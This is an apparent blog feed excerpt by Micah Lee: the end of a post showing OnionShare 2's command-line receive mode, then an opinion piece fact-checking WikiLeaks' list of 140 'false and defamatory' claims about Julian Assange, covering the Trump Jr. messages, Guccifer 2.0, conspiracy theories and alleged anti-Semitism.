&lt;p&gt;And finally, you may want to run your anonymous dropbox on a headless Linux server, rather than your normal daily workstation. OnionShare comes with two binaries, &lt;code&gt;onionshare&lt;/code&gt; (the command line version) and &lt;code&gt;onionshare-gui&lt;/code&gt; (the graphical version). Both of them share the same configuration file -- in Linux, this is in &lt;code&gt;~/.config/onionshare/onionshare.json&lt;/code&gt;. So, using the graphical version of OnionShare, choose all of the settings that you'd like, and then copy &lt;code&gt;onionshare.json&lt;/code&gt; to your server, and run OnionShare like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ onionshare --receive
OnionShare 2.0 | https://onionshare.org/
Connecting to the Tor network: 100% - Done
Setting up onion service on port 17612.
 * Running on http://127.0.0.1:17612/ (Press CTRL+C to quit)

Files sent to you appear in this folder: /home/user/OnionShare

Warning: Receive mode lets people upload files to your computer. Some files can potentially take control of your computer if you open them. Only open things from people you trust, or if you know what you are doing.

Give this address to the sender:
http://v2oxpolhvyd3kh44drt6gtz57v7wwun2twddcw3xhim2kgu2vvcewvqd.onion

Press Ctrl+C to stop the server
127.0.0.1 - - [18/Feb/2019 10:48:04] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:06] "GET /static/css/style.css HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:07] "GET /static/js/receive-noscript.js HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:07] "GET /static/js/receive.js HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:07] "GET /static/js/jquery-3.3.1.min.js HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:07] "GET /static/img/logo.png HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:08] "GET /static/img/logo_large.png HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:10] "GET /static/img/favicon.ico HTTP/1.1" 200 -
Feb 18, 10:48AM: Upload of total size 102.1 KiB is starting
=&amp;gt; 101.9 KiB       2016_tax_return.pdf
Received: /home/user/OnionShare/2019-02-18/10.48.18/2016_tax_return.pdf
127.0.0.1 - - [18/Feb/2019 10:48:20] "POST /upload-ajax HTTP/1.1" 200 -
127.0.0.1 - - [18/Feb/2019 10:48:21] "GET /static/img/ajax.gif HTTP/1.1" 200 -
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id="onionshare-in-your-language"&gt;OnionShare in your language&lt;/h3&gt;&lt;p&gt;&lt;img src="onionshare-persian.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Finally, one of the things I'm most excited about OnionShare 2 is that it has now been translated into twelve new languages, making OnionShare accessible to a considerable swath of humanity. Some of the major languages that OnionShare 2 is translated in include Spanish (400 million native speakers), Portuguese (215 million), Russian (170 million), and Japanese (130 million). (These numbers &lt;a href="https://www.babbel.com/en/magazine/the-10-most-spoken-languages-in-the-world"&gt;come from&lt;/a&gt; Babbel magazine.)&lt;/p&gt;
&lt;p&gt;The new languages include: Bengali (বাংলা), Catalan (Català), Danish (Dansk), French (Français), Greek (Ελληνικά), Italian (Italiano), Japanese (日本語), Persian (فارسی), Brazilian Portuguese (Português Brasil), Russian (Русский), Spanish (Español), and Swedish (Svenska), and more languages will be included in the future. If you're a native speaker of a non-English language and are interested in contributing to OnionShare, you can find &lt;a href="https://github.com/micahflee/onionshare/wiki/Translating"&gt;instructions&lt;/a&gt; for helping on the wiki.&lt;/p&gt;
&lt;p&gt;I hope you like OnionShare 2!&lt;/p&gt;
</content></entry><entry><title>Lies That WikiLeaks Tells You</title><link href="https://micahflee.com/2019/01/lies-that-wikileaks-tells-you/" rel="alternate"></link><updated>2019-01-11T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:08b2a3c3-e7f0-3f2d-825a-1a12e297b5a1</id><content type="html">&lt;p&gt;Last weekend, WikiLeaks sent an email to journalists with a list of 140 things not to say about WikiLeaks and Julian Assange because they are "false and defamatory." Reuters first &lt;a href="https://www.reuters.com/article/us-britain-ecuador-assange/wikileaks-tells-reporters-140-things-not-to-say-about-julian-assange-idUSKCN1P00NN"&gt;broke&lt;/a&gt; the story, and the next day Emma Best &lt;a href="https://emma.best/2019/01/07/140-things-youre-not-allowed-to-say-about-assange-or-wikileaks/"&gt;published&lt;/a&gt; the complete list. Many of the things on the list can't actually be "false" because they're subjective or nuanced ("It is false and defamatory to suggest that Julian Assange is a 'hacker'"), and many aren't defamatory, even if they are false ("It is false and defamatory to suggest that Julian Assange’s profession is 'computer programmer'.").&lt;/p&gt;
&lt;p&gt;And many of the the things on the list are &lt;em&gt;true&lt;/em&gt;, and WikiLeaks/Assange are being misleading. Some directly relate to me -- they came from Twitter fights I've with WikiLeaks and its minions. So I thought I'd fact check WikiLeaks' "false and defamatory" censorship list. This is by no means an exhaustive fact check -- for example, I'm not not covering the list items about the two Swedish women who accused Assange of rape, though I'm pretty confident a lot of that stuff is misleading as well. Before digging into the misinformation, I first want to take a moment to discuss how pathetic this is.&lt;/p&gt;
&lt;p&gt;First, the email starts out with, "CONFIDENTIAL LEGAL COMMUNICATION. NOT  FOR PUBLICATION," but whoever sent a copy of it to Reuters and Emma Best didn't break any off-the-record agreement with WikiLeaks. That's not how that works, which WikiLeaks really ought to know. Simply stating that your email is not for publication doesn't make it off-the-record -- both parties have to agree.&lt;/p&gt;
&lt;p&gt;Second, while it's been clear for some time that WikiLeaks isn't the pro-transparency, pro-free speech, anti-censorship organization that it pretends to be, this latest feeble attempt at ego-driven image management is just sad. It reminds me of when WikiLeaks &lt;a href="https://www.newsweek.com/wikileaks-documentary-makers-accuse-assange-censorship-626613"&gt;used legal threats to try to censor&lt;/a&gt; the documentary film &lt;em&gt;Risk (2016)&lt;/em&gt; because the filmmakers wouldn't remove scenes of Assange, who consented to being filmed, making sexist comments about women.&lt;/p&gt;
&lt;h3 id="secret-dms-with-donald-trump-jr"&gt;Secret DMs with Donald Trump, Jr.&lt;/h3&gt;&lt;p&gt;In November 2017, the Atlantic &lt;a href="https://www.theatlantic.com/politics/archive/2017/11/the-secret-correspondence-between-donald-trump-jr-and-wikileaks/545738/"&gt;revealed&lt;/a&gt; secret Twitter direct messages between @wikileaks and @DonaldJTrumpJr. WikiLeaks did most of the fanboying, but Trump Jr. responded some of the time, too.&lt;/p&gt;
&lt;p&gt;Highlights of the exchange include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WikiLeaks asked Trump Jr. to, "Leak us one or more of your father’s tax returns," arguing that biased liberal media might publish them at any time, and that, "If we publish them it will dramatically improve the perception of our impartiality," adding, "That means that the vast amount of stuff that we are publishing on Clinton will have much higher impact, because it won’t be perceived as coming from a ‘pro-Trump’ ‘pro-Russia’ source." (Had Trump sent Assange a tax return, I have no doubt that WikiLeaks would have pretended it came from a whistleblower, rather than being an officially sanctioned leak.)&lt;/li&gt;
&lt;li&gt;WikiLeaks suggested that Trump scream about rigged elections if he lost against Clinton: “Hi Don if your father ‘loses’ we think it is much more interesting if he DOES NOT conceed [sic] and spends time CHALLENGING the media and other types of rigging that occurred -- as he has implied that he might do.”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After Trump won the election:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WikiLeaks asked if president-elect Trump could award Assange with an Australian ambassadorship: "It would be real easy and helpful for your dad to suggest that Australia appoint Assange ambassador to [Washington,] DC."&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now, back to the "false and defamatory" claims.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange or WikiLeaks has ever colluded with or conspired with, or compromised the integrity of its journalism for, any political campaign or State [in fact, published communication records show WikiLeaks doing exactly the opposite: rejecting approaches by Cambridge Analytica and the Trump campaign for information on its pending publications, see &lt;a href="https://defend.wikileaks.org/"&gt;https://defend.wikileaks.org/&lt;/a&gt;].&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I'd argue that the secret exchange with Trump Jr. is "conspiring with" a political campaign, and that it compromised the integrity of WikiLeaks as an objective news organization. Had they been up-front about their pro-Trump bias the entire time, it would have still been unethical, but it wouldn't have been such a betrayal.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks tried to have the Trump administration appoint Julian Assange as an ambassador or to have any other person or state appoint him as an ambassador.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This one is a pretty blatant lie, considering WikiLeaks tried to have the Trump administration get Australia to appoint Julian Assange as an ambassador. And it doesn't really help Assange's case that he tweeted about it:&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-ambassadorship.png" alt=""&gt;&lt;/p&gt;
&lt;h3 id="guccifer-2-0-the-gru-run-persona-that-provided-wikileaks-with-dnc-and-podesta-emails"&gt;Guccifer 2.0, the GRU-run persona that provided WikiLeaks with DNC and Podesta emails&lt;/h3&gt;&lt;p&gt;Guccifer 2.0, the online persona that claimed to be a Romanian "lone hacker," took credit for hacking into the DNC, and began leaking DNC emails to journalists. But the Mueller investigation released a &lt;a href="https://theintercept.com/2018/07/18/mueller-indictment-russian-hackers/"&gt;mountain of evidence&lt;/a&gt; that shows that this persona, along with faux-leak site DCLeaks, the hackers responsible for the spearphishing campaign that hacked Clinton campaign chairman John Podesta's Gmail account, and the hackers who hacked the DCCC and DNC networks, are all controlled by specific Russian military intelligence officers, working for the GRU.&lt;/p&gt;
&lt;p&gt;Check the link above for more details, but here's a quick example. The spearphishing email that hacked Podesta's account included it Bitly link. The email address that registered that Bitly account, "dirbinsaabol@mail.com," was also used to sign up for an "online cryptocurrency service" (probably BitPay), and that account was used to pay for registering the domain dcleaks.com. Oh, also, the @Guccifer_2 Twitter account always logged in from a VPN service, except for once, when they &lt;a href="https://www.thedailybeast.com/exclusive-lone-dnc-hacker-guccifer-20-slipped-up-and-revealed-he-was-a-russian-intelligence-officer"&gt;apparently forgot to connect to the VPN&lt;/a&gt; and logged in from an IP address that geolocated to a GRU building in Moscow.&lt;/p&gt;
&lt;p&gt;According to Mueller's indictment of GRU hackers, WikiLeaks contacted Guccifer 2.0 asking that they "[s]end any new material [stolen from the DNC] here for us to review and it will have a much higher impact than what you are doing." When Guccifer 2.0 ignored them, they asked again a few weeks later: “if you have anything hillary related we want it in the next tweo [sic] days prefable [sic] because the DNC [Democratic National Convention] is approaching and she will solidify bernie supporters behind her after," adding that "we think trump has only a 25% chance of winning against hillary … so conflict between bernie and hillary is interesting."&lt;/p&gt;
&lt;p&gt;In response, Guccifer 2.0 sent a plaintext email to WikiLeaks, with an encrypted attachment called "wk dnc link1.txt.gpg" saying, "the encrypted file contained instructions on how to access an online archive of stolen DNC documents." Just over a week later, WikiLeaks began publishing the DNC emails.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange is, or has ever been, close to the Russian state, the Kremlin or Vladimir Putin.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So this one is a bit more nuanced. The source for WikiLeak's most influential leak, the DNC and Podesta emails, was a bunch of GRU officers trying to influence the 2016 election. And at various times WikiLeaks spread misinformation in order to protect their source's identity (see below). But does this mean that WikiLeaks or Julian Assange was "close to" the GRU?&lt;/p&gt;
&lt;p&gt;Guccifer 2.0 was also a source for many other journalists (although, they all named their source as Guccifer 2.0; WikiLeaks pretended their source was a whistleblower), and it's plausible that Assange didn't realize he was communicating with GRU officers and thought it was a "lone hacker." So, I'm not really sure. But in any case, it's ridiculous for WikiLeaks to thinks this topic should be off limits to journalists considering the Russian military hacked a U.S. political party, leaked emails to WikiLeaks, and they published them at key points in order to hurt the Clinton campaign. And once it became clear to Assange who his source actually was, he chose to keep up the misinformation.&lt;/p&gt;
&lt;h2 id="assange-breathing-life-into-the-seth-rich-conspiracy-theory"&gt;Assange breathing life into the Seth Rich conspiracy theory&lt;/h2&gt;&lt;p&gt;Shortly after WikiLeaks began publishing DNC emails, Assange went on a Dutch TV and &lt;a href="https://www.dispatch.com/news/20180715/wikileaks-founder-assange-lied-to-protect-russia-charges-on-hacked-emails-suggest"&gt;encouraged&lt;/a&gt; the conspiracy theory that Seth Rich, a former DNC staffer who was killed in Washington, DC in what police believe was a botched robbery, was his source, and that the Democrats had him murdered for leaking emails to WikiLeaks. The exchange goes like this:&lt;/p&gt;
&lt;iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/Kp7FkLBRpKg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;strong&gt;Assange brings up Seth Rich out of nowhere:&lt;/strong&gt; "There's a 27-year-old, who works for the DNC, who was shot in the back -- murdered -- just a few weeks ago, for unknown reasons as he was walking down the street in Washington."&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; "That was just a robbery, I believe, wasn't it?"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Assange:&lt;/strong&gt; "No. There's no finding."&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; "What are you suggesting?"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Assange:&lt;/strong&gt; "I'm suggesting that our sources take risks, and they become concerned to see things occurring like that--"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; "But was he one of your sources then?"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Assange:&lt;/strong&gt; "We don't comment on who our sources are, but--"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; "Then why make the suggestion? About a young guy being shot in the streets of Washington?"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Assange:&lt;/strong&gt; "Because we have to understand how high the stakes are in the United States, and that our sources are -- you know, our sources face serious risks. That's why they come to us, so that we can protect their anonymity."&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; "But it's quite something to suggest a murder. That's basically what you're doing."&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Assange:&lt;/strong&gt; "Well, others have suggested that. We are investigating to understand what happened in that situation, with Seth Rich. I think it is a concerning situation. There's not a conclusion yet, we wouldn't be willing to say a conclusion, but we are concerned about it. And more important, a variety of WikiLeaks sources are concerned when that kind of thing happens."&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange claimed that any person or entity was their source for WikiLeaks’ 2016 U.S. election publications [it is defamatory because Julian Assange’s professional reputation is substantially based on source protection].&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So yup, that's a straight up lie. I guess unless you try to argue that Assange's interaction on that show wasn't a "claim".&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange has ever published, uttered or tried to promote alleged conspiracy theories claiming “John Podesta engaged in satanic rituals”, the “Democratic Party had Seth Rich Killed”, “Clinton wore earpieces to the 2016 US election debates”, on “Clinton’s health” or “Clinton kidnapping children”.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;That's another lie. Assange definitely "uttered" and "tried to promote" the Seth Rich conspiracy theory.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange has ever stated or suggested that any particular person was their source for any publication, including Seth Rich.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Another lie.&lt;/p&gt;
&lt;p&gt;Also, Assange didn't just suggest that Seth Rich was his source, he also actively lied about who his source &lt;em&gt;wasn't&lt;/em&gt;. As a guest on Sean Hannity's Fox News show (Assange is a classy guy, I know), he said: "Our source is not the Russian government, and is not a state party."&lt;/p&gt;
&lt;iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/uyCOy25GdjQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;&lt;h3 id="the-pizzagate-conspiracy-theory"&gt;The Pizzagate conspiracy theory&lt;/h3&gt;&lt;p&gt;After WikiLeaks published the Podesta emails and right-wing idiots started sifting through them, they decided that whenever an email mentioned going out for pizza, it was actually a secret code. They concluded that these "pizza" references could only mean that high-ranking Democrats were actually involved in a child sex ring based in the basement of the Comet Ping Pong pizza place in Washington, DC. Edgar Maddison Welch decided to "investigate" Pizzagate, and drove up to DC from North Carolina, bringing three guns with him. When he got to Comet Ping Pong (which, by the way, doesn't have a basement), he fired a gun. He was &lt;a href="https://www.nytimes.com/2017/06/22/us/pizzagate-attack-sentence.html"&gt;sentenced&lt;/a&gt; to four years in prison.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange or WikiLeaks promoted or invented the “pizzagate” conspiracy theory.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;It would be a lot easier to believe that WikiLeaks didn't promote the Pizzagate conspiracy if they weren't hosting a wiki page in order to discuss the conspiracy theorists' findings at &lt;a href="https://our.wikileaks.org/Pizzagate"&gt;https://our.wikileaks.org/Pizzagate&lt;/a&gt;. (Shocking, right? Who realized WikiLeaks actually included a wiki!)&lt;/p&gt;
&lt;p&gt;To be fair, the wiki pages include a disclaimer saying, "It is NOT an endorsed by WikiLeaks for quality of the material, content, or judgement" -- but I mean seriously. You don't see ProPublica hosting community forums for conspiracy theorists. Why is WikiLeaks?&lt;/p&gt;
&lt;h3 id="other-conspiracy-theories"&gt;Other conspiracy theories&lt;/h3&gt;&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange has ever published, uttered or tried to promote a “conspiracy theory”.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Seth Rich and Pizzagate are far from the only ones. WikiLeaks and Assange make off-hand conspiracy-ridden comments on a regular basis. In fact, I &lt;a href="https://twitter.com/wikileaks/status/1000795757983780865"&gt;noticed&lt;/a&gt; WikiLeaks dip into the QAnon conspiracy theory in a reply to Roseanne Barr (if you'd like to lose some critical thinking skills, read the Twitter thread WikiLeaks is commenting on, and the replies to WikiLeaks; the QAnon people were pissed that WikiLeaks wasn't a true believer):&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-conspiracy1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;So, as one does on Twitter, I made fun of them. But I guess they are pro-censorship after all because they blocked me for it. (Just kidding, blocking people on Twitter obviously isn't censorship.)&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-conspiracy2.png" alt=""&gt;&lt;/p&gt;
&lt;h3 id="freedom-of-the-press-foundation-and-securedrop"&gt;Freedom of the Press Foundation and SecureDrop&lt;/h3&gt;&lt;p&gt;After Emma Best published the complete list of 140 things you're not allowed to say about WikiLeaks, WikiLeaks &lt;a href="https://twitter.com/wikileaks/status/1082279551521169408"&gt;tweeted out&lt;/a&gt; a link to the list themselves, which they published on Pastebin. Unsurprisingly, they edited the list first, presumably to remove claims they have a harder time defending. Here's one of the ones they removed:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to deny that Julian Assange co-founded the Freedom of the Press Foundation with John Perry Barlow.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;WikiLeaks and Assange have done a good job at deleting the tweets where they first made this claim, but it's not true.&lt;/p&gt;
&lt;p&gt;Barlow was one of the co-founders of FPF, and he did have a conversation with Assange about starting a new organization that could help bypass the financial censorship WikiLeaks was facing. But that's extend of Assange's role. Having a conversation with a founder doesn't make you a founder.&lt;/p&gt;
&lt;p&gt;However, during a Twitter fight I was involved in, an official WikiLeaks account did make the &lt;a href="https://twitter.com/WLTaskForce/status/826569015095021568"&gt;claim&lt;/a&gt; that &lt;em&gt;I'm not&lt;/em&gt; a co-founder of FPF.&lt;/p&gt;
&lt;p&gt;&lt;img src="wltaskforce-fpf-founder.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When FPF was founded, I was the first (and only, at the time) staff, the chief technology officer. I built the FPF website, including the crowd-funding platform that we used to help WikiLeaks bypass financial censorship. Here's the initial commit I made on the FPF website, from October 30, 2012 (FPF officially launched on December 17, 2012):&lt;/p&gt;
&lt;p&gt;&lt;img src="fpf-initial-commit.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;After starting work at The Intercept, I stepped down as CTO and was voted onto the board of directors.&lt;/p&gt;
&lt;p&gt;That Twitter fight started because I &lt;a href="https://twitter.com/micahflee/status/826560111304773632"&gt;called out&lt;/a&gt; WikiLeaks for taking credit for Aaron Swartz's work, after he died and couldn't defend himself.&lt;/p&gt;
&lt;p&gt;&lt;img src="securedrop.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;It apparently struck such a chord that WikiLeaks included this in their "false and defamatory" censorship list:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange is not the sole first inventor of cryptographically secure “drop boxes” to protect whistleblowers and journalistic sources.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;It's true that Aaron was inspired by WikiLeaks when he began development the DeadDrop project (which was later renamed to SecureDrop) in June 2011. But SecureDrop isn't "WikiLeaks technology." The WikiLeaks leak platform is proprietary, and unlike SecureDrop (which is a free software project) has never had a public security audit. Saying SecureDrop is WikiLeaks technology is a bit like saying "the iPhone is Nokia technology."&lt;/p&gt;
&lt;p&gt;But both leak platforms share a common critical component: anonymity of sources is enforced by making the leak site only available using a Tor onion service. Tor Project, not WikiLeaks, deserves the credit for the "cryptographically secure" part of the WikiLeaks leak platform.&lt;/p&gt;
&lt;p&gt;It could be true that WikiLeaks was the first to &lt;em&gt;have the idea&lt;/em&gt; of using a Tor onion service as a whistleblower drop box though. It was a good idea.&lt;/p&gt;
&lt;h3 id="defending-vladimir-putin"&gt;Defending Vladimir Putin&lt;/h3&gt;&lt;p&gt;In 2015, an anonymous source leaked a massive trove of tax haven data to a German newspaper, who enlisted the help of the International Consortium of Investigative Journalists (ICIJ) to report on it all. ICIJ shared the data with dozens of partners, including the &lt;a href="https://www.occrp.org/en"&gt;Organized Crime &amp;amp; Corruption Reporting Project&lt;/a&gt; (OCCRP). This leak was known as the Panama Papers, and in revealed scandals around the world, investigated by over 100 newsrooms, and reported in 25 languages.&lt;/p&gt;
&lt;p&gt;One of these scandals, reported by OCCRP in collaboration with investigative journalists at the Russian newspaper Novaya Gazeta, &lt;a href="https://www.occrp.org/en/panamapapers/persons/putin/"&gt;implicated Putin's close friend Sergei Roldugin&lt;/a&gt;. Roldugin, a cellist, was implicated in stealing $230 million from Russian tax payers in 2007. Putin was angry about the scandal, and so was WikiLeaks, it turned out.&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-putin1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-putin2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Keep in mind that the documents were real, and the Putin-linked corruption that was revealed actually happened. After WikiLeaks tweeted in Putin's defense, &lt;a href="https://twitter.com/micahflee/status/950778944940158976"&gt;Putin himself cited WikiLeaks&lt;/a&gt; in order to dismiss the scandal:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;“Besides,” [Putin] added, “we now know from WikiLeaks that officials and state agencies in the United States are behind all this.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange called the Panama Papers “a Soros-funded attack against Putin” [see &lt;a href="https://twitter.com/wikileaks/status/717810984673484800"&gt;https://twitter.com/wikileaks/status/717810984673484800&lt;/a&gt;].&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Sure, they didn't use the words "Soros-funded," though they included "Open Society Institute &amp;amp; Soros Foundations Network" in their tweet calling this (true, brave, risky for Russian journalists) investigative journalism an "attack story on Putin."&lt;/p&gt;
&lt;p&gt;I wrote a &lt;a href="https://twitter.com/micahflee/status/950778501270917120"&gt;Twitter thread&lt;/a&gt; about this topic that goes into greater detail. That's just one example of WikiLeaks protecting Putin's government. Here's another:&lt;/p&gt;
&lt;p&gt;In 2012, WikiLeaks published a trove of over two million hacked emails from the Syrian government, called the &lt;a href="https://wikileaks.org/Syria-Files.html"&gt;Syria Files&lt;/a&gt;. But, according to &lt;a href="https://www.dailydot.com/layer8/wikileaks-syria-files-syria-russia-bank-2-billion/"&gt;court records&lt;/a&gt; about the hacktivists that breached Syria's computers, obtained by the Daily Dot, WikiLeaks withheld an email from the Syria Files. This email described a €2 billion transaction between the Syrian government and a state-owned Russia bank. It appears that WikiLeaks selectively suppressed this email to avoid implicating the Russian government.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange has ever suppressed materials critical of Israel, Russia or any other State.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I'm gonna call this one a lie.&lt;/p&gt;
&lt;h3 id="anti-semitism-and-the-far-right"&gt;Anti-Semitism and the far right&lt;/h3&gt;&lt;p&gt;Julian Assange appears to have a problem with Jews. I first noticed when WikiLeaks tweeted this (they've since deleted it):&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-antisemite1.jpg" alt=""&gt;&lt;/p&gt;
&lt;p&gt;The parentheses refer to a neo-Nazi meme called "echoes," which identifies Jews online by surrounding their names with three parentheses. In response to the meme, many Jewish people and some allies began to bracket their names on Twitter in a show of solidarity.&lt;/p&gt;
&lt;p&gt;Shortly after that tweet, in a private Twitter DM group, WikiLeaks called Jewish investigative journalist Raphael Satter a "rat," after he tweeted an article he wrote for the Associated Press about the harm caused when WikiLeaks publishes private information about individuals. (A member of this Twitter DM group leaked the incredibly revealing messages to me, and I &lt;a href="https://theintercept.com/2018/02/14/julian-assange-wikileaks-election-clinton-trump/"&gt;reported&lt;/a&gt; on them for The Intercept. You can also see my Twitter thread about these leaked DMs &lt;a href="https://twitter.com/micahflee/status/963852295271104512"&gt;here&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-antisemite2.jpg" alt=""&gt;&lt;/p&gt;
&lt;p&gt;WikiLeaks then instructed the followers to "Bog him down. Get him to show his bias." (Those leaked DMs show a pattern of WikiLeaks leading troll campaigns like this one.)&lt;/p&gt;
&lt;p&gt;People used to be able to donate to WikiLeaks using the FPF website, a system we set up in order to bypass the financial censorship that WikiLeaks was facing. But at the end of 2017, after WikiLeaks failed to show us any evidence that the 2010 financial blockade against them was still ongoing, the FPF board of directors &lt;a href="https://freedom.press/news/beyond-blockade/"&gt;unanimously voted&lt;/a&gt; to take down our WikiLeaks donate button (they could still receive credit card donations through a separate non-profit in Europe). In response, WikiLeaks orchestrated a troll campaign against me personally (I describe it in &lt;a href="https://twitter.com/micahflee/status/948999951853301760"&gt;this Twitter thread&lt;/a&gt; if you're interested).&lt;/p&gt;
&lt;p&gt;As part of the trolling campaign, Assange called us rats, and an official WikiLeaks Twitter account, along with swarms of WikiLeaks fans, piled on, using other anti-Semitic imagery and language.&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-antisemite3.jpg" alt=""&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-antisemite4.jpg" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Nazis and other anti-Semites have a &lt;a href="https://www.theguardian.com/artanddesign/shortcuts/2015/nov/18/rats-the-history-of-an-incendiary-cartoon-trope"&gt;long history&lt;/a&gt; of calling people they despise, like Jews and immigrants, rats.&lt;/p&gt;
&lt;p&gt;And here's another tidbit of evidence of anti-Semitism. In 2014, someone Assange hired to ghostwrite his memoir, who ended up turning down the job, &lt;a href="https://www.lrb.co.uk/v36/n05/andrew-ohagan/ghosting"&gt;described&lt;/a&gt; bigoted ramblings "in which he’d uttered, late at night, many casual libels, many sexist or anti-Semitic remarks, and where he spoke freely about every aspect of his life."&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange is an anti-semite.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Like many of the things on the "false and defamatory" list, this one is subjective. But, from my perspective, it's pretty clear that he's an anti-Semite.&lt;/p&gt;
&lt;p&gt;But that's not all. Assange started showing signs of anti-Semitism long before 2016 though. In 2013, former WikiLeaks employee James Ball &lt;a href="https://www.thedailybeast.com/exclusive-former-wikileaks-employee-james-ball-describes-working-with-julian-assange"&gt;described&lt;/a&gt; his falling out with Assange in an article for the Daily Beast:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The reason I quit was because of a friend of Julian’s whose activities were unstomachable and unforgivable. That man was Israel Shamir. Shamir is an anti-Semitic writer, a &lt;a href="http://www.counterpunch.org/2010/12/31/the-minsk-election-in-a-wikileaks-mirror/"&gt;supporter of the dictator of Belarus&lt;/a&gt;, and a man with ties and friends in Russian security services. He and Julian -- unknown to us -- had been in friendly contact for years. It was a friendship that would have serious consequences.&lt;/p&gt;
&lt;p&gt;Introduced to WikiLeaks staff and supporters under a false name, Shamir was given direct access to more than 90,000 of the U.S. Embassy cables, covering Russia, all of Eastern Europe, parts of the Middle East, and Israel. This was, for quite some time, denied by WikiLeaks. But that’s never a denial I’ve found convincing: the reason I know he has them is that I gave them to him, at Assange’s orders, not knowing who he was.&lt;/p&gt;
&lt;p&gt;Why did this prove to be a grave mistake? Not just for Shamir’s views, which are easy to Google, but for what he did next. The first hints of trouble came through contacts from various Putin-influenced Russian media outlets. A pro-Putin outlet got in touch to say Shamir had been asking for $10,000 for access to the cables. He was selling the material we were working to give away free, to responsible outlets.&lt;/p&gt;
